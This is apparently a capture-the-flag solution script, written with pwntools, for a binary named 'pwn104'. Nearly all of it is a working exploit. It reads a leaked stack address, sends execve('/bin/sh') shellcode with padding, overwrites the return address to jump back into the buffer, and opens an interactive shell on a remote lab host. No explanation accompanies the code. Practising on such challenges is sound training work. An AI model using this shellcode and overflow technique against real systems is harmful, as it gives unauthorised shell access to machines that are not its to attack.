from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('10.10.43.85', 9004)
    else:
        r = process('./pwn104.pwn104')
    
    libc = ELF('./pwn104.pwn104', checksec=False)
    r.recvuntil("I'm waiting for you at ")
    buf_addr = int(r.recv(14).decode().strip(), 16)
    log.info(f"Address of buf: {hex(buf_addr)}")
    payload = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'   # 27 bytes
    payload += b'A'*61
    payload += p64(buf_addr)                                                                                                    #Back to buf
    r.sendline(payload)
    r.interactive()

exploit(True)